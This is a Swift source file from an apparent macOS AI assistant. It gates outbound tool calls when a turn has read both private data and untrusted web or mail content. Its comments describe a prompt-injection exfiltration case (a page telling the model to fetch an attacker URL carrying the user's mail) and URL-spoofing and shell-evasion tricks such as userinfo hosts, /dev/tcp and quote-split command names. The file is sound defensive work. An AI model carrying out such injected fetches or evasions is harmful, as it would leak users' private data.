// OutboundGate.swift
// Context-Dock
//
// The "lethal trifecta" gate: private data, untrusted content and an outbound channel in the
// same turn.
//
// A turn that reads the user's mail AND a web page that says "fetch https://attacker/?d=<the
// mail>" is one `read_url` call away from handing the mail over. The untrusted-content fence
// asks the model not to obey the page; it is a request, and the model is the thing being
// persuaded. This gate is the host's half of the answer (plan rule 1: the model proposes, the
// host decides): once a turn holds BOTH kinds of data, the tools that can carry data out ask
// the user first, or refuse when nobody is there to ask.
//
// One decision, one function: `OutboundGate.decide`. Everything else in this file either feeds
// it (what the turn touched, what the call would reach) or words its answer. It is pure, so a
// test reaches it without a Mac, an approval sheet or a model.

import Foundation

/// What one turn has touched so far. Both set is the dangerous state.
struct TurnTaint: Equatable, Sendable {
    /// A private-data read ran: Mail, Messages, Notes, Contacts, Calendar, a file, the clipboard.
    var readPrivateData = false
    /// Text the user did not write entered the turn: anything `UntrustedContent.fenced` wrapped.
    var readUntrustedContent = false

    /// Both flags. Either alone runs freely: reading your own mail is the product, and reading a
    /// web page is the product; the pair is what makes an outbound call an exfiltration route.
    var isBoth: Bool { readPrivateData && readUntrustedContent }
}

enum OutboundGate {

    // MARK: - What a call would do

    /// The ways a tool call can carry data off this Mac.
    enum Kind: Equatable, Sendable {
        /// A web address the model chose. Has a host to judge.
        case fetch
        /// A message, mail or share leaving for another person.
        case message
        /// A Shortcut: opaque, can do anything including send.
        case shortcut
        /// A shell command that reaches the network, or is too opaque to tell.
        case shell
        /// Anything else that can plausibly send data out (an adapter action, an app script).
        case external
    }

    struct Target: Equatable, Sendable {
        let kind: Kind
        /// Normalised host for `.fetch`; nil when there is none, or when it cannot be read
        /// unambiguously (which the gate treats as "not one the user typed").
        let host: String?
        /// The exact URL for `.fetch` in the form `canonicalURL(fromURL:)` gives; nil when the
        /// address cannot be read unambiguously, which no typed URL can match.
        var url: String? = nil
        /// Short noun phrase for the card, e.g. "run a shortcut".
        let label: String
    }

    // MARK: - The decision

    enum Decision: Equatable, Sendable {
        case allow
        /// Needs the user's yes first. `reason` is the card's sentence; `host` is set for a fetch.
        case ask(reason: String, host: String?)
        /// Unattended: nobody can say yes, so nothing runs.
        case refuse(reason: String)
    }

    /// THE gate. Pure.
    ///
    /// - Parameters:
    ///   - taint: what this turn has touched.
    ///   - target: what the call would reach.
    ///   - typedURLs: canonical URLs the USER typed in this thread (never tool output or model
    ///     text; see `typedURLs(in:)`).
    ///   - attended: a person is at the keyboard and can answer a card.
    static func decide(
        taint: TurnTaint, target: Target, typedURLs: Set<String>, attended: Bool
    ) -> Decision {
        guard taint.isBoth else { return .allow }
        // The user pointed DoraX at this exact address themselves: scheme, host, port, path and
        // query all equal. Another path or query on the same host is a page's idea (a link, an
        // injected "fetch https://site/log?d=<data>"), so it asks once.
        if target.kind == .fetch, let url = target.url, typedURLs.contains(url) {
            return .allow
        }
        let reason = cardReason(target: target)
        return attended
            ? .ask(reason: reason, host: target.host)
            : .refuse(reason: reason + " Nobody is at the keyboard to approve it, so nothing ran.")
    }

    /// The sentence the card shows. Names the host when there is one.
    static func cardReason(target: Target) -> String {
        let lead = "This turn read your private data and a web page; DoraX is about to "
        switch target.kind {
        case .fetch:
            if let host = target.host { return lead + "contact \(host)." }
            return lead + "contact a web address it could not read safely."
        case .message, .shortcut, .shell, .external:
            return lead + target.label + "."
        }
    }

    // MARK: - Hosts

    /// The host of `urlString` as the gate compares it, or nil when the string is not a plain
    /// http(s) URL whose host every parser would read the same way.
    ///
    /// nil is the safe answer: the gate treats it as a host the user did not type. Rejected on
    /// purpose, because Swift and the converter that actually fetches (a Python tool) disagree
    /// about them, and a disagreement is where an attacker's host hides: userinfo
    /// (`https://good.com@evil.com`), backslashes, whitespace and control characters,
    /// percent-encoded or non-ASCII hosts, a leftover trailing dot.
    static func normalizedHost(fromURL urlString: String) -> String? {
        let trimmed = urlString.trimmingCharacters(in: .whitespacesAndNewlines)
        // Interior whitespace is not a URL any two parsers will read alike.
        guard !trimmed.isEmpty, !trimmed.contains(where: \.isWhitespace), URL(string: trimmed) != nil,
            let schemeEnd = trimmed.range(of: "://")
        else { return nil }
        let scheme = trimmed[..<schemeEnd.lowerBound].lowercased()
        guard scheme == "http" || scheme == "https" else { return nil }
        // The authority is everything up to the first / ? or #, and only it is held to a strict
        // shape: a path or query may contain @, % and the rest. Parsed by hand rather than with
        // URLComponents, which decodes punycode and percent-escapes in `host`, so two spellings
        // of one host would compare unequal and a crafted spelling could read as another.
        var host = String(
            trimmed[schemeEnd.upperBound...].prefix { $0 != "/" && $0 != "?" && $0 != "#" })
        guard !host.unicodeScalars.contains(where: {
            $0 == "\\" || $0 == "%" || $0 == "@" || !$0.isASCII
                || CharacterSet.whitespacesAndNewlines.contains($0)
                || CharacterSet.controlCharacters.contains($0)
        }) else { return nil }
        if host.hasPrefix("[") {
            // [IPv6] with an optional :port
            guard let close = host.firstIndex(of: "]") else { return nil }
            let tail = host[host.index(after: close)...]
            guard tail.isEmpty || (tail.hasPrefix(":") && tail.dropFirst().allSatisfy(\.isNumber))
            else { return nil }
            host = String(host[host.index(after: host.startIndex)..<close])
        } else if let colon = host.lastIndex(of: ":") {
            let port = host[host.index(after: colon)...]
            guard port.allSatisfy(\.isNumber) else { return nil }
            host = String(host[..<colon])
        }
        return normalizedHost(host)
    }

    /// The whole address as the gate compares it: lower-case scheme and authority (the host's
    /// one trailing dot dropped), the path and query exactly as written, the fragment dropped
    /// (it is never sent), an empty path read as `/`. nil whenever `normalizedHost(fromURL:)` is.
    static func canonicalURL(fromURL urlString: String) -> String? {
        guard normalizedHost(fromURL: urlString) != nil else { return nil }
        let trimmed = urlString.trimmingCharacters(in: .whitespacesAndNewlines)
        guard let schemeEnd = trimmed.range(of: "://") else { return nil }
        let scheme = trimmed[..<schemeEnd.lowerBound].lowercased()
        let afterScheme = trimmed[schemeEnd.upperBound...]
        var authority = String(afterScheme.prefix { $0 != "/" && $0 != "?" && $0 != "#" }).lowercased()
        if authority.hasSuffix(".") { authority.removeLast() }
        var rest = String(afterScheme.drop { $0 != "/" && $0 != "?" && $0 != "#" })
        if let hash = rest.firstIndex(of: "#") { rest = String(rest[..<hash]) }
        if rest.isEmpty { rest = "/" } else if rest.hasPrefix("?") { rest = "/" + rest }
        return "\(scheme)://\(authority)\(rest)"
    }

    /// Lower-case, one trailing dot dropped, ASCII only. nil for anything else.
    static func normalizedHost(_ host: String) -> String? {
        var h = host.lowercased()
        if h.hasSuffix(".") { h.removeLast() }
        guard !h.isEmpty, !h.hasSuffix("."), !h.hasPrefix("."), !h.contains("..") else { return nil }
        let allowed = CharacterSet(charactersIn: "abcdefghijklmnopqrstuvwxyz0123456789.-:")
        guard h.unicodeScalars.allSatisfy({ allowed.contains($0) }) else { return nil }
        return h
    }

    /// Hosts the user typed in `texts` (their own messages in this thread, never tool output
    /// or model text). Full http(s) URLs, plus bare domains such as `example.com`.
    ///
    /// An email domain (`bob@evil.com`) is not a host the user pointed DoraX at, so a domain
    /// directly after `@` is skipped.
    static func typedHosts(in texts: [String]) -> Set<String> {
        var found = Set<String>()
        for text in texts {
            for match in matches(urlPattern, in: text) {
                if let host = normalizedHost(fromURL: match) { found.insert(host) }
            }
            for match in matches(barePattern, in: text) {
                guard let host = normalizedHost(match), looksLikeDomainOrIPv4(host) else { continue }
                found.insert(host)
            }
        }
        return found
    }

    /// The exact addresses the user typed in `texts`: each full http(s) URL, and for a bare
    /// domain (with or without a path) the http and https forms of that address. A trailing
    /// sentence mark is read both ways, because "see https://a.site/x." means `/x`.
    static func typedURLs(in texts: [String]) -> Set<String> {
        var found = Set<String>()
        func add(_ candidate: String) {
            if let url = canonicalURL(fromURL: candidate) { found.insert(url) }
        }
        let marks = CharacterSet(charactersIn: ".,;:!?")
        for text in texts {
            for match in matches(urlPattern, in: text) {
                add(match)
                add(match.trimmingCharacters(in: marks))
            }
            for match in matches(barePathPattern, in: text) {
                for candidate in [match, match.trimmingCharacters(in: marks)] {
                    let hostPart = String(candidate.prefix { $0 != "/" && $0 != "?" && $0 != "#" })
                    guard let host = normalizedHost(hostPart), looksLikeDomainOrIPv4(host) else {
                        continue
                    }
                    add("https://" + candidate)
                    add("http://" + candidate)
                }
            }
        }
        return found
    }

    private static let urlPattern = #"https?://[^\s<>"'`\)\]\}]+"#
    // A dotted name not glued to an @ (email), a word or a path on its left.
    private static let barePattern =
        #"(?<![@\w.\-/])[A-Za-z0-9](?:[A-Za-z0-9\-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]*[A-Za-z0-9])?)+(?![\w\-])"#

    private static let barePathPattern = barePattern + #"(?:[/?][^\s<>"'`\)\]\}]*)?"#

    private static func matches(_ pattern: String, in text: String) -> [String] {
        guard let regex = try? NSRegularExpression(pattern: pattern) else { return [] }
        let range = NSRange(text.startIndex..., in: text)
        return regex.matches(in: text, range: range).compactMap {
            Range($0.range, in: text).map { String(text[$0]) }
        }
    }

    private static func looksLikeDomainOrIPv4(_ host: String) -> Bool {
        let labels = host.split(separator: ".")
        guard labels.count >= 2, let last = labels.last else { return false }
        if labels.allSatisfy({ $0.allSatisfy(\.isNumber) }) { return labels.count == 4 }
        return last.count >= 2 && last.allSatisfy { $0.isLetter }
            || last.hasPrefix("xn--")
    }

    // MARK: - Classifying a call

    /// Looks the gate cannot do without the registry, injected so this stays pure.
    struct Lookups {
        /// Whether the adapter action with this id can send data out; nil when unknown.
        var adapterActionSendsData: (String) -> Bool? = { _ in nil }
        /// What a route offered this turn would do: (kind, payload); nil when unknown.
        var route: (String) -> (kind: String, payload: String)? = { _ in nil }
    }

    /// What this call would reach, or nil when it cannot carry data out.
    ///
    /// Conservative on purpose: a call that is hard to read is classified as outbound. Over-asking
    /// costs one card in a turn that already holds both kinds of data; under-asking is the hole.
    static func target(
        toolName: String, arguments: [String: Any], lookups: Lookups = Lookups()
    ) -> Target? {
        switch toolName {
        case "read_url":
            let raw = (arguments["url"] as? String ?? "")
            return Target(
                kind: .fetch, host: normalizedHost(fromURL: raw), url: canonicalURL(fromURL: raw),
                label: "contact a web address")

        case "run_shortcut":
            return Target(kind: .shortcut, host: nil, label: "run a Shortcut, which can send data out")

        case "compose_message":
            return Target(kind: .message, host: nil, label: "start a message to someone")

        case "run_command", "spawn_worker":
            let command = arguments["command"] as? String ?? ""
            return shellReachesNetwork(command) ? shellTarget : nil

        case "run_menu_command":
            return namesASend(arguments["path"]) ? sendTarget : nil

        case "run_app_script":
            return Target(kind: .external, host: nil, label: "run an app script that can reach the network")

        case "run_adapter_action":
            let id = (arguments["action_id"] as? String ?? "")
                .trimmingCharacters(in: .whitespacesAndNewlines)
            return lookups.adapterActionSendsData(id) == false ? nil : adapterTarget

        case "run_route":
            let id = (arguments["route_id"] as? String ?? "").trimmingCharacters(in: .whitespacesAndNewlines)
            guard let route = lookups.route(id) else { return adapterTarget }
            switch route.kind {
            case "cli": return shellReachesNetwork(route.payload) ? shellTarget : nil
            case "menuCommand": return namesASend(route.payload) ? sendTarget : nil
            case "adapterAction": return adapterTarget
            default: return nil
            }

        case "run_capability":
            let id = (arguments["capability_id"] as? String ?? "")
            var input: [String: String] = [:]
            for (k, v) in (arguments["input"] as? [String: Any] ?? [:]) {
                input[k] = (v as? String) ?? String(describing: v)
            }
            return capabilityTarget(id: id, input: input, lookups: lookups)

        default:
            // A tool this table does not know is, by construction, one nobody has judged.
            // Registered built-ins are all listed above or in `localTools` / `ungatedTools`
            // (a test holds the registry to that); an extension tool resolved at run time is
            // not, and comes through `unknownToolTarget`.
            return nil
        }
    }

    // MARK: - Every tool is judged

    /// Tools `target` can classify as outbound (its switch above).
    static let outboundTools: Set<String> = [
        "read_url", "run_shortcut", "compose_message", "run_command", "spawn_worker",
        "run_menu_command", "run_app_script", "run_adapter_action", "run_route", "run_capability",
    ]

    /// Built-in tools judged to be local: they read, search or write on this Mac and cannot
    /// carry data to another host.
    static let localTools: Set<String> = [
        "read_page", "read_file", "read_attachment", "read_selection", "read_tool_result",
        "find_files", "find_capability", "find_route", "list_shortcuts", "verify_outcome",
        "write_output_file", "search_messages", "get_messages_conversations",
    ]

    /// Built-in tools that can reach further than the table above judges, left ungated on
    /// purpose and listed here so that is a decision on the record, not an omission: an MCP
    /// tool, and the three that drive another app's UI (the owner's call, #164).
    static let ungatedTools: Set<String> = [
        "run_mcp_tool", "operate_app", "send_keys", "window_control",
    ]

    /// Whether a tool name has been judged. The registry test requires it of every built-in, so
    /// a new network tool cannot ship ungated by being left out of `target`.
    static func isClassified(toolName: String) -> Bool {
        outboundTools.contains(toolName) || localTools.contains(toolName)
            || ungatedTools.contains(toolName)
    }

    /// An L2 extension tool, resolved by name at run time: arbitrary code nobody has judged.
    static let unknownToolTarget = Target(
        kind: .external, host: nil, label: "run an extension that can reach the network")

    private static let shellTarget = Target(
        kind: .shell, host: nil, label: "run a command that can reach the network")
    private static let sendTarget = Target(
        kind: .message, host: nil, label: "send something to someone")
    private static let adapterTarget = Target(
        kind: .external, host: nil, label: "run an app action that can send data out")

    static func capabilityTarget(
        id: String, input: [String: String], lookups: Lookups = Lookups()
    ) -> Target? {
        let lower = id.lowercased()
        if lower == "terminal.runcommand" || lower == "cli.run" {
            let command = input["command"] ?? input["cmd"] ?? ""
            return command.isEmpty || shellReachesNetwork(command) ? shellTarget : nil
        }
        let sending = ["compose", "send", "share", "upload", "publish", "post", "createdraft",
                       "newmessage", "messages.new", "reply", "forward"]
        if sending.contains(where: { lower.contains($0) }) { return sendTarget }
        if lower.hasPrefix("calendar."), input.keys.contains(where: { $0.lowercased().contains("attendee")
            || $0.lowercased().contains("invitee") })
        {
            return sendTarget
        }
        let reachingOut = ["extension.run", "mcp.call", "appadapter.run", "starter.youtube",
                           "starter.ddg", "starter.maps", "starter.downie"]
        if reachingOut.contains(where: { lower.hasPrefix($0) || lower == $0 }) { return adapterTarget }
        // An id that is not a registered capability is an adapter action; the registry knows
        // whether that one sends anything.
        if let sends = lookups.adapterActionSendsData(id) {
            return sends ? adapterTarget : nil
        }
        return nil
    }

    private static func namesASend(_ path: Any?) -> Bool {
        let text: String
        if let s = path as? String { text = s } else if let a = path as? [String] { text = a.joined(separator: " ") }
        else { return false }
        let words = text.lowercased().split { !$0.isLetter }.map(String.init)
        let send: Set<String> = ["send", "share", "email", "upload", "post", "publish", "submit",
                                 "reply", "forward", "airdrop"]
        return words.contains { send.contains($0) }
    }

    // MARK: - Shell

    /// Whether a shell command could reach the network. An allow-list: it does not, only when
    /// EVERY segment is a known local command (`knownLocalCommands`). Anything else, and anything
    /// too opaque to read (substitution, escapes, subshells, a device that is a socket), counts
    /// as reaching it. An empty command runs nothing.
    static func shellReachesNetwork(_ command: String) -> Bool {
        !shellIsLocalOnly(command)
    }

    static func shellIsLocalOnly(_ command: String) -> Bool {
        let lower = command.lowercased()
        if lower.contains("://") || lower.contains("mailto:") { return false }
        if lower.contains("$(") || lower.contains("`") || lower.contains("\\") || lower.contains("${")
            || lower.contains("<(") || lower.contains(">(")
        {
            return false
        }
        // /dev/tcp and /dev/udp are sockets that `>` and `<` can open without any command.
        if lower.contains("/dev/tcp") || lower.contains("/dev/udp") { return false }
        // A quote in the middle of a word (c"u"rl) hides a name from a word split.
        if lower.range(of: #"[a-z0-9]["'][a-z0-9]"#, options: .regularExpression) != nil { return false }
        // Subshells, groups and function bodies: not read, so asked about.
        if command.contains(where: { "(){}".contains($0) }) { return false }
        // Every separator splits (a superset of what the shell splits on, so a quoted `;` only
        // makes the check stricter): each segment must be a known command on its own.
        let segments = command.split(
            omittingEmptySubsequences: true,
            whereSeparator: { ";|&\n\r".contains($0) })
        for segment in segments {
            let words = segment.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init)
            guard let first = words.first else { continue }
            guard let name = localCommandName(first), knownLocalCommands.contains(name) else {
                return false
            }
            if !localArguments(name, Array(words.dropFirst())) { return false }
        }
        return true
    }

    /// `ls`, or `/bin/ls` and `/usr/bin/ls`; any other path could be any program.
    private static func localCommandName(_ word: String) -> String? {
        guard word.contains("/") else { return word }
        for prefix in ["/bin/", "/usr/bin/"] where word.hasPrefix(prefix) {
            let name = String(word.dropFirst(prefix.count))
            return name.contains("/") ? nil : name
        }
        return nil
    }

    /// The few allow-listed commands that can still run another program or open a connection
    /// through an argument.
    private static func localArguments(_ name: String, _ args: [String]) -> Bool {
        switch name {
        case "git":
            // The subcommand must come first (no `-c`, `--exec-path`...) and be a read.
            guard let sub = args.first else { return false }
            return gitLocalSubcommands.contains(sub)
                && !args.contains(where: { $0.hasPrefix("--ext-diff") || $0.hasPrefix("--upload-pack") })
        case "find":
            let running: Set<String> = ["-exec", "-execdir", "-ok", "-okdir"]
            return !args.contains(where: running.contains)
        case "sort":
            return !args.contains(where: { $0.hasPrefix("--compress-program") })
        default:
            return true
        }
    }

    /// Commands that read or list this Mac and cannot open a connection or start another program
    /// from their arguments alone (`find` and `sort` and `git` are checked in `localArguments`).
    /// Deliberately short: a command not here asks, only when the turn holds both kinds of data.
    private static let knownLocalCommands: Set<String> = [
        "ls", "cat", "head", "tail", "grep", "egrep", "fgrep", "find", "wc", "pwd", "echo",
        "printf", "cd", "stat", "file", "du", "df", "date", "whoami", "which", "uname",
        "basename", "dirname", "tree", "diff", "cmp", "sort", "uniq", "cut", "tr", "sw_vers",
        "hostname", "id", "true", "false", "git",
    ]

    /// The `git` subcommands that only read the local repository.
    private static let gitLocalSubcommands: Set<String> = [
        "status", "log", "diff", "show", "rev-parse", "ls-files", "blame", "describe",
        "shortlog", "grep",
    ]

    // MARK: - Private reads

    /// Whether a SUCCESSFUL call just read the user's private data.
    static func readsPrivateData(toolName: String, arguments: [String: Any]) -> Bool {
        switch toolName {
        case "read_file", "read_attachment", "read_selection", "find_files",
            "get_messages_conversations", "search_messages", "run_mcp_tool", "run_route":
            return true
        case "run_command", "spawn_worker":
            let c = (arguments["command"] as? String ?? "").lowercased()
            return c.contains("pbpaste") || c.contains("~") || c.contains(NSHomeDirectory().lowercased())
                || c.contains("/users/") || c.contains("/library/") || c.contains("sqlite")
        case "run_capability":
            let id = (arguments["capability_id"] as? String ?? "").lowercased()
            return privateCapabilityPrefixes.contains { id.hasPrefix($0) }
        default:
            return false
        }
    }

    /// Whether a SUCCESSFUL call just read text a third party wrote: a mail, a message, a note
    /// (shared notes, pasted text). The model's view of it is unchanged, so it is not fenced;
    /// the gate alone counts it as untrusted, next to private.
    static func readsThirdPartyContent(toolName: String, arguments: [String: Any]) -> Bool {
        switch toolName {
        case "get_messages_conversations", "search_messages":
            return true
        case "run_capability":
            let id = (arguments["capability_id"] as? String ?? "").lowercased()
            return thirdPartyCapabilityPrefixes.contains { id.hasPrefix($0) }
        default:
            return false
        }
    }

    private static let thirdPartyCapabilityPrefixes = ["mail.", "messages.", "notes."]

    /// Apps whose content is mostly written by other people (the mailbox, the threads, shared
    /// notes). A chat scoped to one starts with that text already in the prompt.
    static func isThirdPartyContentApp(bundleID: String?) -> Bool {
        guard let id = bundleID?.lowercased() else { return false }
        return ["com.apple.mail", "com.apple.mobilesms", "com.apple.notes"].contains(id)
    }

    /// Apps whose whole content is the user's private data. A turn scoped to one starts with that
    /// data already in the prompt (a mailbox snapshot, a thread), with no tool call to see it by.
    static func isPrivateDataApp(bundleID: String?) -> Bool {
        guard let id = bundleID?.lowercased() else { return false }
        return privateDataApps.contains(id)
    }

    private static let privateDataApps: Set<String> = [
        "com.apple.mail", "com.apple.mobilesms", "com.apple.notes", "com.apple.addressbook",
        "com.apple.ical", "com.apple.reminders", "com.apple.photos", "com.apple.journal",
        "com.apple.passwords", "com.apple.stickies", "com.apple.voicememos", "com.apple.health",
    ]

    private static let privateCapabilityPrefixes: [String] = [
        "mail.", "messages.", "notes.", "contacts.", "calendar.", "reminders.", "clipboard.",
        "photos.", "quicknotes.", "memory.", "files.", "finder.readfile", "finder.grepfiles",
        "finder.listfolder", "finder.summarizefolder", "finder.searchfiles", "finder.recent",
        "finder.fileinfo", "browser.history", "browser.bookmarks", "capture.",
        "system.capturescreenshot", "dorax.clipboard", "dorax.preview",
    ]

    // MARK: - The approval card

    /// The capability the card is raised for. High risk, so it is shown as an approval, and one
    /// shape so every entry point raises the same card.
    static let approvalCapabilityID = "turn.outboundGate"

    /// The plan the shared approval inbox shows. `what` is the model's own one-liner for the
    /// call (a URL, a command, a shortcut name), shown below the reason so the user can see it.
    static func approvalPlan(reason: String, what: String) -> AIActionPlan {
        AIActionPlan(
            capability: approvalCapabilityID,
            input: ["call": what],
            explanation: reason + "\n\nThe page may be asking for this, not you. Allow it only "
                + "if it is what you meant.")
    }
}

// MARK: - What the user typed

/// The text the USER typed for the turn running in this task.
///
/// A provider loop is handed a `message` and a `history` and, normally, the message is the
/// user's own sentence. A follow-up pass is not: the "look again" retry, the answer corrector
/// and the verifier each hand the loop a prompt DoraX composed, and it quotes the model's
/// previous answer and the tools it ran. A host named there is not a host the user typed, and
/// treating it as one would let an injected page widen its own allowlist.
///
/// A task-local, like `UnattendedRun`, so the three provider loops and eight adapters between
/// the caller and the registry do not each grow a parameter. Bound by the caller that knows.
nonisolated enum TurnUserText {
    @TaskLocal static var current: [String]?

    /// What the loops treat as typed: the bound text when a follow-up pass bound one, else the
    /// user's messages in the thread plus the message being answered.
    static func resolve(history: [ChatMessage], message: String) -> [String] {
        current ?? (history.filter { $0.role == .user }.map(\.content) + [message])
    }

    /// Run `body` with the thread's user messages and the user's own `query` as the typed text.
    static func bind<T>(
        history: [ChatMessage], query: String, _ body: () async throws -> T
    ) async rethrows -> T {
        try await bind(typed: history.filter { $0.role == .user }.map(\.content) + [query], body)
    }

    static func bind<T>(typed: [String], _ body: () async throws -> T) async rethrows -> T {
        try await $current.withValue(typed, operation: body)
    }
}

// MARK: - Per-turn bookkeeping

/// What each live turn has touched and which hosts its user typed.
///
/// Keyed by `AgentTurnToken`, so two chats running at once never share a flag: one starting a
/// turn cannot clear another's, and a turn that ends takes its flags with it. Main-actor
/// isolated, like the registry that owns it, so the read-modify-write on a flag cannot race.
/// A test makes its own instance; nothing here is process-wide.
@MainActor
final class TurnTaintTracker {
    private struct Entry {
        var taint = TurnTaint()
        var typedURLs = Set<String>()
    }

    private var entries: [AgentTurnToken: Entry] = [:]

    var liveCount: Int { entries.count }

    /// Opens a turn's record.
    /// - Parameters:
    ///   - userText: what the USER typed in this thread (their messages only).
    ///   - promptBlocks: text already placed in the prompt (context, history). A fence in any
    ///     of them means the turn starts with untrusted content in front of the model.
    ///   - startsPrivate: the prompt already carries the user's private data (a chat scoped to
    ///     Mail, Messages, Notes...), so no read is needed to have it.
    ///   - startsUntrusted: the prompt already carries text other people wrote (the same chats:
    ///     a mailbox snapshot, a thread).
    func begin(
        _ token: AgentTurnToken, userText: [String], promptBlocks: [String] = [],
        startsPrivate: Bool = false, startsUntrusted: Bool = false
    ) {
        var entry = Entry()
        entry.taint.readPrivateData = startsPrivate
        entry.typedURLs = OutboundGate.typedURLs(in: userText)
        entry.taint.readUntrustedContent = startsUntrusted
            || promptBlocks.contains(where: UntrustedContent.containsFence)
        entries[token] = entry
    }

    func end(_ token: AgentTurnToken) { entries.removeValue(forKey: token) }

    /// What the turn has touched. A turn this tracker has no record of (never begun, already
    /// ended or evicted, or no turn at all) is treated as having touched everything: unknown
    /// history is the dangerous kind.
    func taint(for token: AgentTurnToken?) -> TurnTaint {
        guard let token, let entry = entries[token] else {
            return TurnTaint(readPrivateData: true, readUntrustedContent: true)
        }
        return entry.taint
    }

    func typedURLs(for token: AgentTurnToken?) -> Set<String> {
        guard let token else { return [] }
        return entries[token]?.typedURLs ?? []
    }

    func notePrivateRead(_ token: AgentTurnToken?) {
        guard let token, entries[token] != nil else { return }
        entries[token]?.taint.readPrivateData = true
    }

    func noteUntrusted(_ token: AgentTurnToken?) {
        guard let token, entries[token] != nil else { return }
        entries[token]?.taint.readUntrustedContent = true
    }

    /// Records what a finished call touched.
    func record(
        toolName: String, arguments: [String: Any], output: String, succeeded: Bool,
        turn: AgentTurnToken?
    ) {
        if succeeded, OutboundGate.readsPrivateData(toolName: toolName, arguments: arguments) {
            notePrivateRead(turn)
        }
        // Mail, Messages and Notes bodies are not fenced (the model reads them as they are), but
        // a stranger wrote them: a hostile email is the textbook injection.
        if succeeded, OutboundGate.readsThirdPartyContent(toolName: toolName, arguments: arguments) {
            noteUntrusted(turn)
        }
        if UntrustedContent.containsFence(output) { noteUntrusted(turn) }
    }
}
